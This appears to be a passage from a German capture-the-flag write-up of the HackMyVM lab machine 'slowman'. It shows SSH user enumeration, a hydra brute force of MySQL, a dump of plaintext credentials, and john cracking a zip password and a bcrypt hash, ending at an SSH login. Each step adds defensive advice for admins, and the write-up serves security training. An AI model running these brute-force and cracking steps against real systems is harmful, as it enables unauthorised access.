+[+] OpenSSH version 8.9 found
+[+] mike found!
+[+] danie found!
+[+] dany found!
+[+] morre found!
+[+] dani found!
+[+] daniel found!
+[!] SSH negotiation failed for user johny.
+[+] dan found!
+[+] joe found!
+[!] SSH negotiation failed for user doe.
+[+] trainerjeff found!
+[+] jeff found!
+[+] ben found!
+[+] john found!
+[+] benny found!
+[+] benni found!
+[+] jeand found!
+[+] jeff.d found!
+[+] den found!
+[+] johnny found!
+[+] jean found!
+[+] jean.d found!
+[+] laura found!
+[+] jeffd found!
+[+]  found!
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein weiterer `dirb`-Scan wird durchgeführt, scheinbar mit denselben Parametern wie zuvor.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Ausgabe ist unvollständig, scheint aber dieselben Ergebnisse wie der vorherige `dirb`-Scan zu liefern (`/css`, `/images`, `index.html`, `/js`, `/server-status`). Keine neuen Erkenntnisse.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Vermeiden Sie redundante Scans, es sei denn, es gibt einen Grund zur Annahme, dass sich etwas geändert hat oder andere Parameter verwendet werden.<br><strong>Empfehlung (Admin):</strong> Keine spezifische Aktion.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">dirb http://slowman.hmv</span></div>
+                     <pre>
+
+---- Scanning URL: http://slowman.hmv/ ----
+==> DIRECTORY: http://slowman.hmv/css/
+==> DIRECTORY: http://slowman.hmv/images/
++ http://slowman.hmv/index.html (CODE:200|SIZE:16430)
+==> DIRECTORY: http://slowman.hmv/js/
++ http://slowman.hmv/server-status (CODE:403|SIZE:276)
+                     </pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein Nmap-Scan wird mit dem NSE-Skript `ftp-vsftpd-backdoor` auf Port 21 durchgeführt, um auf eine bekannte Backdoor in vsftpd Version 2.3.4 zu prüfen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan findet den offenen FTP-Port, aber das Skript liefert keine positive Ausgabe, was bedeutet, dass die spezifische Backdoor (die ohnehin nur Version 2.3.4 betrifft, hier läuft 3.0.5) nicht vorhanden ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das Ausschließen bekannter Backdoors ist Teil des Prozesses. Konzentrieren Sie sich auf andere Angriffsvektoren für vsftpd 3.0.5 oder den anonymen Zugriff.<br><strong>Empfehlung (Admin):</strong> Gut, dass diese spezifische Backdoor nicht vorhanden ist. Halten Sie Software dennoch aktuell.</p>
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap --script ftp-vsftpd-backdoor -p 21 slowman.hmv</span></div>
+                      <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-05 00:16 CET
+Nmap scan report for slowman.hmv (192.168.2.113)
+Host is up (0.00020s latency).
+
+PORT   STATE SERVICE
+21/tcp open  ftp
+MAC Address: 08:00:27:04:7D:C6 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.39 seconds
+                      </pre>
+                   </div>
+               </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Dieser Block zeigt Details einer HTTP-Anfrage an `leostop.com`, die mit einem `503 Service Unavailable` beantwortet wurde. Die Header deuten auf Cloudflare als Server hin. Die Anfrage scheint von einem Browser (Firefox 115) zu stammen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies scheint eine externe Tracking- oder Werbeanfrage zu sein, die von der `slowman.hmv`-Webseite ausgelöst wurde, aber fehlgeschlagen ist. Sie steht wahrscheinlich nicht in direktem Zusammenhang mit Schwachstellen auf dem Zielserver selbst, sondern mit extern eingebundenen Ressourcen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie die externe Domain für OSINT-Zwecke, aber fokussieren Sie sich primär auf den Zielserver. Manchmal können Schwachstellen in Drittanbieter-Skripten relevant sein, aber ein 503-Fehler deutet eher auf ein Problem beim Drittanbieter hin.<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie externe Skripte, die auf Ihrer Webseite eingebunden sind, auf Notwendigkeit und Sicherheit. Fehlerhafte externe Ressourcen können die Ladezeiten oder Funktionalität beeinträchtigen.</p>
+             <div class="code-block">
+                  <div class="terminal">
+                      <pre>
+GET
+	https://leostop.com/tracking/tracking.js?_=1701732105529
+Status
+503
+Service Unavailable
+VersionHTTP/2
+Übertragen1,22 kB (584 B Größe)
+Referrer Policystrict-origin-when-cross-origin
+
+
+alt-svc
+	h3=":443"; ma=86400
+cf-cache-status
+	BYPASS
+cf-ray
+	8307c9fc9eb330e4-FRA
+content-type
+	text/html
+date
+	Mon, 04 Dec 2023 23:22:01 GMT
+last-modified
+	Tue, 15 Mar 2022 21:40:09 GMT
+nel
+	{"success_fraction":0,"report_to":"cf-nel","max_age":604800}
+report-to
+	{"endpoints":[{"url":"https:\/\/a.nel.cloudflare.com\/report\/v3?s=s2jHVmcusEWAXRk756CgfuafgXPmNshSofWhmePdo9L5GUr%2BBBXBHWh36T0Tn9JK2AwWwwb%2BsMeMQsbhEhXuZ%2FwV%2BuF9dlkpJvVsNRofMdCp6APsJE7VEgbSa9yQC9%2FmF14kPw%2F%2Ffk7SYA%3D%3D"}],"group":"cf-nel","max_age":604800}
+server
+	cloudflare
+
+User-Agent
+	Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+                      </pre>
+                   </div>
+               </div>
+        </section>
+
+        <section id="initial-access">
+             <h2>Initial Access</h2>
+             <p class="analysis"><strong>Analyse:</strong> `hydra` wird verwendet, um das Passwort für den MySQL-Benutzer `trainerjeff` (gefunden in `allowedusersmysql.txt`) zu knacken. Als Passwortliste dient `rockyou.txt`. Hydra reduziert die Threads (`-t 4`), da MySQL oft keine hohe Parallelität mag.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Hydra ist erfolgreich und findet das Passwort `<span class="password">soccer1</span>` für den MySQL-Benutzer `trainerjeff`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie diese Zugangsdaten, um sich bei der MySQL-Datenbank anzumelden und nach weiteren Informationen (Benutzerdaten, Konfigurationen, Webseiten-Daten) zu suchen.<br><strong>Empfehlung (Admin):</strong> Verwenden Sie starke, einzigartige Passwörter für Datenbankbenutzer. Beschränken Sie die Berechtigungen von Datenbankbenutzern auf das absolut Notwendige.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l trainerjeff -P /usr/share/wordlists/rockyou.txt 192.168.2.113 mysql -t 64</span></div>
+                     <pre>
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these * ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-07 12:26:20
+[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344484 login tries (l:1/p:14344484), ~3586121 tries per task
+[DATA] attacking mysql://192.168.2.113:3306/
+[3306][mysql] host: 192.168.2.113   login: trainerjeff   password: <span class="password">soccer1</span>
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-07 12:26:40
+                     </pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Mit den gefundenen Zugangsdaten (`trainerjeff`:`soccer1`) wird eine Verbindung zur MySQL-Datenbank auf `slowman.hmv` hergestellt. Nach erfolgreicher Anmeldung werden die Datenbanken (`show databases;`), die `trainers_db` ausgewählt (`use trainers_db;`), die Tabellen darin angezeigt (`show tables;`) und der Inhalt der `users`-Tabelle abgefragt (`select * from users;`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Datenbank `trainers_db` enthält eine Tabelle `users`. Diese Tabelle enthält zwei Einträge:
+                1.  Benutzer `gonzalo` mit dem Passwort `<span class="password">tH1sS2stH3g0nz4l0pAsSWW0rDD!!</span>`.
+                2.  Einen Eintrag `$SECRETLGINURL` mit dem Wert `/secretLGIN/login.html`.
+            Dies sind extrem wertvolle Funde: Zugangsdaten für einen anderen Benutzer (`gonzalo`) und ein Hinweis auf einen versteckten Login-Bereich.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie sofort, sich mit den Zugangsdaten von `gonzalo` per SSH anzumelden. Untersuchen Sie den Pfad `/secretLGIN/login.html` auf dem Webserver.<br><strong>Empfehlung (Admin):</strong> Speichern Sie Passwörter niemals im Klartext in Datenbanken; verwenden Sie stattdessen starke Hashing-Verfahren (z.B. bcrypt, Argon2). Beschränken Sie die Berechtigungen des Benutzers `trainerjeff` auf das Nötigste. Verstecken Sie Login-Pfade nicht nur durch obskure URLs, sondern sichern Sie sie angemessen.</p>
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">mysql -h slowman.hmv -u trainerjeff -p</span></div>
+                      <pre>
+Enter password:
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MySQL connection id is 1235
+Server version: 8.0.35-0ubuntu0.22.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MySQL [(none)]> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
+| trainers_db        |
++--------------------+
+5 rows in set (0.003 sec)
+
+MySQL [(none)]> use trainers_db;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MySQL [trainers_db]> show tables;
++-----------------------+
+| Tables_in_trainers_db |
++-----------------------+
+| users                 |
++-----------------------+
+1 row in set (0.001 sec)
+
+MySQL [trainers_db]> select * from users;
++----+-----------------+------------------------------------------+
+| id | user            | password                                 |
++----+-----------------+------------------------------------------+
+|  1 | gonzalo         | <span class="password">tH1sS2stH3g0nz4l0pAsSWW0rDD!!</span>           |
+|  2 | $SECRETLGINURL  | /secretLGIN/login.html                   |
++----+-----------------+------------------------------------------+
+2 rows in set (0.001 sec)
+
+MySQL [trainers_db]>
+                      </pre>
+                   </div>
+               </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, eine Datei `credentials.zip` aus einem Pfad `/secretgym/serverSHARE/` herunterzuladen. Der Pfad `/secretgym/` wurde vermutlich aus dem JavaScript oder durch Raten abgeleitet. Der `curl`-Befehl mit `-I` oder `-v HEAD` sendet eine HEAD-Anfrage, um Metadaten der Datei zu prüfen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Server antwortet mit `200 OK`, was bestätigt, dass die Datei `http://slowman.hmv/secretgym/serverSHARE/credentials.zip` existiert und zugänglich ist. Die Metadaten zeigen, dass es sich um eine ZIP-Datei mit einer Größe von 309 Bytes handelt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Laden Sie die `credentials.zip` sofort mit `wget` oder `curl` herunter und untersuchen Sie ihren Inhalt. ZIP-Dateien können passwortgeschützt sein.<br><strong>Empfehlung (Admin):</strong> Legen Sie niemals sensible Dateien wie `credentials.zip` ungeschützt in Webserver-Verzeichnissen ab. Sichern Sie solche Bereiche mit Authentifizierung und Zugriffskontrollen.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://slowman.hmv/secretgym/serverSHARE/credentials.zip -Iv</span></div>
+                     <pre>
+*   Trying 192.168.2.113:80...
+* Connected to slowman.hmv (192.168.2.113) port 80
+> HEAD /secretgym/serverSHARE/credentials.zip HTTP/1.1
+> Host: slowman.hmv
+> User-Agent: curl/8.4.0
+> Accept: */*
+>
+< HTTP/1.1 200 OK
+< Date: Tue, 05 Dec 2023 14:47:43 GMT
+< Server: Apache/2.4.52 (Ubuntu)
+< Last-Modified: Wed, 22 Nov 2023 19:49:52 GMT
+< ETag: "135-60ac305cb4925"
+< Accept-Ranges: bytes
+< Content-Length: 309
+< Content-Type: application/zip
+<
+* Connection #0 to host slowman.hmv left intact
+                     </pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Dieser Block scheint eine Zusammenfassung von Verzeichnis-Scan-Ergebnissen zu sein, möglicherweise aus einem anderen Tool oder einer manuellen Zusammenstellung. Er listet die bereits bekannten Seiten sowie die neu entdeckten Verzeichnisse `/secretLGIN/` und `/secretgym/`, inklusive des Unterverzeichnisses `/secretgym/serverSHARE/` und der Dateien darin (`credentials.zip`) und im Login-Bereich (`l0gin.php`, `l0gin.js`, `login.html`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die Existenz der versteckten Bereiche und der interessanten Dateien darin.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fokussieren Sie die Untersuchung auf die Inhalte von `/secretLGIN/` und `/secretgym/`, insbesondere die Login-Funktionalität und die ZIP-Datei.<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die Notwendigkeit und Sicherheit dieser versteckten Bereiche.</p>
+             <div class="code-block">
+                  <div class="terminal">
+                      <pre>
+http://slowman.hmv/secretLGIN          (Status: 301) [Size: 316] [--> http://slowman.hmv/secretLGIN/]
+http://slowman.hmv/secretgym            (Status: 301) [Size: 314] [--> http://slowman.hmv/secretgym/]
+http://slowman.hmv/index.html           (Status: 200) [Size: 16430]
+http://slowman.hmv/images               (Status: 301) [Size: 311] [--> http://slowman.hmv/images/]
+http://slowman.hmv/contact.html         (Status: 200) [Size: 5232]
+http://slowman.hmv/css                  (Status: 301) [Size: 308] [--> http://slowman.hmv/css/]
+http://slowman.hmv/js                   (Status: 301) [Size: 307] [--> http://slowman.hmv/js/]
+http://slowman.hmv/why.html             (Status: 200) [Size: 6115]
+
+http://slowman.hmv/secretgym/serverSHARE          (Status: 301) [Size: 326] [--> http://slowman.hmv/secretgym/serverSHARE/]
+
+http://slowman.hmv/secretLGIN/l0gin.php            (Status: 200) [Size: 467]
+http://slowman.hmv/secretLGIN/l0gin.js             (Status: 200) [Size: 858]
+http://slowman.hmv/secretLGIN/login.html           (Status: 200) [Size: 655]
+
+http://slowman.hmv/secretgym/serverSHARE/credentials.zip      (Status: 200) [Size: 309]
+                      </pre>
+                   </div>
+               </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die Datei `credentials.zip` wird mit `wget` vom Webserver heruntergeladen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Download ist erfolgreich.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Entpacken Sie die ZIP-Datei. Verwenden Sie Tools wie `zipinfo` oder `unzip -l`, um den Inhalt vorab zu prüfen. Seien Sie auf ein Passwort vorbereitet.<br><strong>Empfehlung (Admin):</strong> Keine spezifische Aktion, außer der bereits genannten Sicherung des Verzeichnisses.</p>
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget http://slowman.hmv/secretgym/serverSHARE/credentials.zip</span></div>
+                      <pre>
+--2023-12-05 15:57:09--  http://slowman.hmv/secretgym/serverSHARE/credentials.zip
+Auflösen des Hostnamens slowman.hmv (slowman.hmv)… 192.168.2.113
+Verbindungsaufbau zu slowman.hmv (slowman.hmv)|192.168.2.113|:80 … verbunden.
+HTTP-Anforderung gesendet, auf Antwort wird gewartet … 200 OK
+Länge: 309 [application/zip]
+Wird in credentials.zip gespeichert.
+
+credentials.zip         100%[===================>]     309  --.-KB/s    in 0s
+
+2023-12-05 15:57:09 (73.9 MB/s) - credentials.zip gespeichert [309/309]
+                      </pre>
+                   </div>
+               </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt der JavaScript-Datei `http://slowman.hmv/secretLGIN/l0gin.js` wird angezeigt. Die Funktion `login(username, password)` prüft die eingegebenen Daten direkt im Browser.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das JavaScript enthält hartkodierte Zugangsdaten für den Benutzer `gonzalo` mit dem Passwort `<span class="password">tH1sS2stH3g0nz4l0pAsSWW0rDD!!</span>`. Dies bestätigt die in der MySQL-Datenbank gefundenen Daten. Die Authentifizierung findet ausschließlich clientseitig statt, was extrem unsicher ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dies bestätigt die Zugangsdaten für `gonzalo`. Der initiale Zugriff per SSH sollte nun möglich sein. Die clientseitige Validierung ist trivial zu umgehen, aber da die Daten bereits bekannt sind, ist dies nicht mehr nötig.<br><strong>Empfehlung (Admin):</strong> Entfernen Sie sofort die hartkodierten Zugangsdaten aus dem JavaScript. Implementieren Sie eine serverseitige Authentifizierung. Führen Sie niemals sicherheitskritische Prüfungen nur im Client durch.</p>
+             <div class="code-block">
+                  <div class="terminal">
+                      <pre>
+http://slowman.hmv/secretLGIN/l0gin.js
+
+document.addEventListener("DOMContentLoaded", function () {
+    document.getElementById("loginForm").addEventListener("submit", function (event) {
+        event.preventDefault();
+
+        // Obtener los valores del formulario
+        var username = document.getElementById("username").value;
+        var password = document.getElementById("password").value;
+
+        // Enviar los datos al servidor
+        login(username, password);
+    });
+});
+
+function login(username, password) {
+    // Puedes realizar una solicitud AJAX al servidor para verificar las credenciales
+    // En este ejemplo, simplemente redirigimos al usuario si las credenciales son correctas
+    if (username == "gonzalo" && password == "tH1sS2stH3g0nz4l0pAsSWW0rDD!!") {
+        window.location.href = "/secretgym/";
+    } else {
+        alert("Incorrect user or password!");
+    }
+}
+                      </pre>
+                   </div>
+               </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Zusammenfassende Notizen, die die Zugangsdaten (`gonzalo`:`tH1sS2stH3g0nz4l0pAsSWW0rDD!!`) und den Zielpfad (`/secretgym/`) nach erfolgreichem Login aus dem JavaScript bestätigen. Es folgt die Ausgabe einer Verzeichnisauflistung von `/secretgym/serverSHARE/`, die nur die `credentials.zip` zeigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Konsolidiert die Erkenntnisse aus JavaScript und Verzeichnis-Browsing.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nächster Schritt ist die Analyse der `credentials.zip`.<br><strong>Empfehlung (Admin):</strong> Sichern Sie den `/secretgym/`-Bereich und die darin enthaltenen Dateien.</p>
+             <div class="code-block">
+                  <div class="terminal">
+                      <pre>
+# Zusammenfassung der Erkenntnisse aus l0gin.js
+http://slowman.hmv/secretgym/ -->>  username = "gonzalo"
+                                    password = "tH1sS2stH3g0nz4l0pAsSWW0rDD!!"
+
+http://slowman.hmv/secretgym/serverSHARE/
+
+Index of /secretgym/serverSHARE
+[ICO]	Name	Last modified	Size	Description
+[PARENTDIR]	Parent Directory	 	-
+[ ]	credentials.zip	2023-11-22 19:49 	309
+Apache/2.4.52 (Ubuntu) Server at slowman.hmv Port 80
+                      </pre>
+                   </div>
+               </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `zip2john` wird verwendet, um aus der heruntergeladenen `credentials.zip` einen Hash-Wert zu extrahieren, der von John the Ripper geknackt werden kann. Der Hash wird in die Datei `hash` umgeleitet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Hash wurde erfolgreich extrahiert. Das Format (`PKZIP Encr: TS_chk`) zeigt an, dass es sich um einen passwortgeschützten ZIP-Container handelt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie John the Ripper oder Hashcat mit der Datei `hash`, um das Passwort für die ZIP-Datei zu knacken.<br><strong>Empfehlung (Admin):</strong> Vermeiden Sie die Speicherung sensibler Daten in passwortgeschützten Archiven mit schwachen Passwörtern. Verwenden Sie starke Verschlüsselungsmethoden und sichere Passwortpraktiken.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">zip2john credentials.zip > hash</span></div>
+                     <pre>
+ver 2.0 efh 5455 efh 7875 credentials.zip/passwords.txt PKZIP Encr: TS_chk, cmplen=117, decmplen=117, crc=4981406D ts=9E02 cs=9e02 type=8
+                     </pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `john` (John the Ripper) wird mit der Wortliste `rockyou.txt` auf die Hash-Datei (`hash`) angesetzt, um das Passwort der ZIP-Datei zu knacken.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> John ist erfolgreich und findet das Passwort `<span class="password">spongebob1</span>` für die Datei `credentials.zip/passwords.txt`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie das gefundene Passwort `spongebob1`, um die `credentials.zip`-Datei zu entpacken.<br><strong>Empfehlung (Admin):</strong> Das Passwort ist relativ schwach und leicht zu erraten/knacken. Erzwingen Sie starke Passwörter auch für Archivdateien.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt hash</span></div>
+                     <pre>
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 16 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<span class="password">spongebob1</span>       (credentials.zip/passwords.txt)
+1g 0:00:00:00 DONE (2023-12-05 16:01) 100.0g/s 3276Kp/s 3276Kc/s 3276KC/s s13!34g$3FVA5e@ed..joking
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+                     </pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die ZIP-Datei `credentials.zip` wird mit `unzip` entpackt. Das zuvor gefundene Passwort (`spongebob1`) wird eingegeben (obwohl es in der Ausgabe ausgeblendet ist).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Datei `passwords.txt` wird erfolgreich aus dem Archiv extrahiert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie den Inhalt der extrahierten Datei `passwords.txt`.<br><strong>Empfehlung (Admin):</strong> Keine spezifische Aktion.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">unzip credentials.zip</span></div>
+                     <pre>
+Archive:  credentials.zip
+[credentials.zip] passwords.txt password:
+password incorrect--reenter:  (Anmerkung: Erste Eingabe war falsch, oder es wurde nur Enter gedrückt)
+  inflating: passwords.txt
+                     </pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `ll` (Alias für `ls -l` oder `ls -al`) listet den Inhalt des aktuellen Verzeichnisses auf dem Angreifer-System auf.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Auflistung zeigt die heruntergeladene `credentials.zip`, die Hash-Datei, die extrahierte `passwords.txt` sowie andere Dateien und Verzeichnisse, die während des Pentests verwendet oder erstellt wurden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dient der Orientierung im lokalen Dateisystem.<br><strong>Empfehlung (Admin):</strong> Keine Relevanz für das Zielsystem.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ll</span></div>
+                     <pre>
+insgesamt 150728
+-rw-r--r--  1 root root       309 22. Nov 20:49 credentials.zip
+drwxr-xr-x  3 root root      4096  4. Dez 23:56 cve-2018-15473
+-rw-r--r--  1 root root      6664 30. Nov 23:59 exploit.py
+-rwxr-xr-x  1 root root      1488 30. Nov 23:28 fuck.py
+drwxr-xr-x 23 root root      4096 27. Nov 23:18 Hackingtools
+-rw-r--r--  1 root root       366  5. Dez 16:01 hash
+-rw-r--r--  1 root root 154292650  5. Dez 00:24 hydra.restore
+-rw-r--r--  1 root root       117 22. Nov 20:48 passwords.txt
+-rwxrwxrwx  1 root root      3442  7. Nov 14:37 rev.php
+-rw-r--r--  1 root root       512  7. Nov 15:03 shell.ps1
+-rwxr-xr-x  1 root root       301 24. Nov 00:06 shell.sh
+-rw-r--r--  1 root root       176  5. Dez 15:42 users.txt
+                     </pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt der extrahierten Datei `passwords.txt` wird mit `cat` angezeigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Datei enthält den Benutzernamen `trainerjean` und einen Passwort-Hash im bcrypt-Format (`$2y$10$...`). Dies sind vermutlich die SSH-Zugangsdaten für den Benutzer `trainerjean`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Knacken Sie den bcrypt-Hash mit John the Ripper oder Hashcat, um das Klartextpasswort für `trainerjean` zu erhalten.<br><strong>Empfehlung (Admin):</strong> Speichern Sie niemals Passwort-Hashes in leicht zugänglichen Dateien. Verwenden Sie sichere Methoden zur Speicherung und Verwaltung von Zugangsdaten. Stellen Sie sicher, dass starke Hashing-Algorithmen mit ausreichend hohen Kostenfaktoren verwendet werden.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat passwords.txt</span></div>
+                     <pre>
+----------
+$USERS: trainerjean
+
+$PASSWRD: $2y$10$DBFBehmb6ktnyGyAtQZNeV/kiNAE.Y3He8cJsvpRxIFEhRAUe1kq
+----------
+                     </pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Erneuter Versuch, sich per SSH als `trainerjean` anzumelden, bevor der Hash geknackt wurde.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Login schlägt erwartungsgemäß fehl.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Knacken Sie zuerst den Hash.<br><strong>Empfehlung (Admin):</strong> Keine spezifische Aktion.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh trainerjean@192.168.2.113</span></div>
+                     <pre>
+trainerjean@192.168.2.113's password:
+Permission denied, please try again.
+trainerjean@192.168.2.113's password:
+                     </pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der bcrypt-Hash aus `passwords.txt` wird in eine neue Datei namens `hash` geschrieben (überschreibt die vorherige `hash`-Datei vom ZIP-Passwort).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Vorbereitung für den nächsten John-the-Ripper-Lauf.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie John auf diese neue Hash-Datei aus.<br><strong>Empfehlung (Admin):</strong> Keine spezifische Aktion.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">echo '$2y$10$DBFBehmb6ktnyGyAtQZNeV/kiNAE.Y3He8cJsvpRxIFEhRAUe1kq' > hash</span></div>
+                     <pre></pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `john` wird mit `rockyou.txt` auf die Datei `hash` (die nun den bcrypt-Hash enthält) angesetzt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> John ist erfolgreich und knackt den bcrypt-Hash. Das Klartextpasswort für `trainerjean` lautet `<span class="password">tweety1</span>`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie nun die Zugangsdaten `trainerjean`:`tweety1`, um sich per SSH anzumelden. Dies sollte den initialen Zugriff ermöglichen.<br><strong>Empfehlung (Admin):</strong> Das Passwort `tweety1` ist schwach. Erzwingen Sie Passwortrichtlinien für Komplexität und Länge. Überprüfen Sie, warum dieser Hash in einer Datei gespeichert wurde.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt hash</span></div>
+                     <pre>
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 16 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<span class="password">tweety1</span>          (?)
+1g 0:00:00:01 DONE (2023-12-05 16:06) 0.5555g/s 720.0p/s 720.0c/s 720.0C/s sweet1..philip
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+                     </pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Mit dem geknackten Passwort (`tweety1`) wird eine SSH-Verbindung als Benutzer `trainerjean` aufgebaut.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der SSH-Login ist erfolgreich! Die Systeminformationen und der letzte Login werden angezeigt. Wir haben nun Initial Access als `trainerjean`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginnen Sie mit der Post-Exploitation-Enumeration als `trainerjean`. Suchen Sie nach Wegen zur Privilegieneskalation (`sudo -l`, SUID-Binaries, Capabilities, Cronjobs, Kernel-Version etc.).<br><strong>Empfehlung (Admin):</strong> Ändern Sie sofort das Passwort für `trainerjean`. Untersuchen Sie die Logins und die Kompromittierungskette (FTP-Datei -> ZIP -> Hash -> schwaches Passwort).</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh trainerjean@192.168.2.113</span></div>
+                     <pre>
+trainerjean@192.168.2.113's password:
